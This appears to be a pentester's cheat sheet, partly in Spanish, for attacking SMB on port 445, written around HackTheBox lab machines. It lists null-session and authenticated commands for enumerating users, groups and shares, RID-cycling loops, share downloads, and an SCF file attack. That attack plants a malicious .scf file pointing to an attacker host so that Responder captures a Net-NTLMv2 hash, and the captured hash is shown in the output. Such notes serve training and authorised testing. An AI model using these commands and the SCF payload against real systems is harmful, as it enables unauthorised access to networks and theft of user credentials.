# Port 445 - SMB



## Test connection

```bash
rpcclient -U "" -N <IP> #No creds
rpcclient -U "username%passwd" <IP> #With creds

smbclient --no-pass -L //<IP> # Null user
```



## Enumeration

### Basic Info

```bash
enum4linux -a <TARGET-IP> [-u "" -p ""]

smbclient --no-pass //<TARGET-IP>/<Folder> # Null session

##### RPCCLIENT #####
# Test Connection
rpcclient -U "" -N <TARGET-IP> # Null session
rpcclient //machine.htb -U domain.local/<USER>%<HASH> --pw-nt-hash
rpcclient -U "<USER>%<PASS>" <TARGET-IP> #With creds

# Domain Info
querydominfo         # Description of the domain
enumdomains           # List domains in the network
getdompwinfo          # Password policy info

# Enum users
enumdomuser           # List all users
querydispinfo         # Description of users
queryuser <RID>       # Description of an user by his rid
queryuser <name>      # Description of an user by his name
lsaenumsid            # Enum sid's of users
lookupnames <Name>    # Enum sid's for an user
getusrdompwinfo <RID> # Password policy of an user

# Enum groups
enumdomgroups         # List of groups
querygroup <RID>      # Description of the group

querygroupmem <RID>   # List rid's of the users in this group
```

### Shared Folders

```bash
smbmap -H <TARGET-IP> -u 'asdasd' # Null session
smbmap [-u "username" -p "password"] -R [Folder] -H <TARGET-IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <TARGET-IP> [-P <PORT>] # Non-Recursive list

crackmapexec smb 10.10.10.192 -u 'asdasd' -p '' --shares # Null session
## RPCCLIENT
netshareenum
netshareenumall
netsharegetinfo <SHARE-NAME>

## Download Shared Folders
smbmap -H <TARGET-IP> -u 'username' -p 'password' --download '<Path>' # one file

smbclient //<target-ip>/<shared-foldaer> -N             # Null session
smbclient //<target-ip>/<shared-foldaer> -U "<username>%password>"
smb: \> prompt off         
smb: \> recurse on         
smb: \> mget * 
```

### Mount

<pre class="language-bash"><code class="lang-bash">apt install cifs-utils

<strong>mount -t cifs //&#x3C;ip>/&#x3C;shared> /mnt/&#x3C;somefolder> [-o username=&#x3C;algo>,password=&#x3C;algo>,domain=,rw]
</strong>umount /mnt/&#x3C;somefolder>
</code></pre>

## Explotación

### Rid Cycling

Este ataque consta de enumerar usuarios con sus RID's y SID's a través de una null session con rpcclient.

```bash
rpcclient -U "" -N 10.10.10.129 -c "lsaenumsid" # sin creds
found 6 SIDs

S-1-5-32-550
S-1-5-32-548
S-1-5-32-551
S-1-5-32-549
S-1-5-32-544

for i in $(seq 500 600); do rpcclient -U "" -N 10.10.10.129 -c "lookupsids S-1-5-32-$i" 2>/dev/null; done | grep -viE "unknown"
S-1-5-32-544 BUILTIN\Administrators (4)
S-1-5-32-545 BUILTIN\Users (4)
S-1-5-32-546 BUILTIN\Guests (4)
S-1-5-32-547 BUILTIN\Power Users (4)
...


# A nivel de sistema siempre existe el usuario root por lo que 
# podremos listar su sid, y este nos dará otro grupo de sids
# para seguir enumerando usuarios

rpcclient -U "" -N 10.10.10.129 -c "lookupnames root"                                              
root S-1-22-1-0 (User: 1)

for i in $(seq 0 600); do rpcclient -U "" -N 10.10.10.129 -c "lookupsids S-1-22-1-$i" 2>/dev/null; done | grep -viE "unknown" 
S-1-22-1-0 Unix User\root (1)
S-1-22-1-1 Unix User\daemon (1)
S-1-22-1-2 Unix User\bin (1)
S-1-22-1-3 Unix User\sys (1)
S-1-22-1-4 Unix User\sync (1)
S-1-22-1-5 Unix User\games (1)
```



### SCF File Attacks

Este ataque consta de si tenemos acceso a una carpeta compartida a nivel de red en la que podemos colocar un archivo con extensión .scf malicioso que nos va a permitir generar una conexión desde la máquina en la que se ejecute dicho archivo automáticamente, proveyéndonos el hash Net-NTLMv2 para su posterior crackeo.

{% code title="@some.scf" %}
```sh
[Shell]
Command=2
IconFile=\\X.X.X.X\share\some.ico
[Taskbar]
Command=ToggleDesktop
```
{% endcode %}

Activamos el responder:&#x20;

{% code overflow="wrap" %}
```java
responder -I tun0 -dw 

[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:88f9e2309575569a:083F2CCE110D8865D30D206CA6845E71:01010000000000008053022A2919DA0133742111E113D434000000000200080048004D004B004A0001001E00570049004E002D003100480050004F0030004A005A005100320034005A0004003400570049004E002D003100480050004F0030004A005A005100320034005A002E0048004D004B004A002E004C004F00430041004C000300140048004D004B004A002E004C004F00430041004C000500140048004D004B004A002E004C004F00430041004C00070008008053022A2919DA01060004000200000008003000300000000000000001000000002000005FFA777B02D96CA2EC88A47091BFDF1D2EEC3BE65A5880CE2FE33FC252D6F8680A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003800000000000000000000000000    
```
{% endcode %}

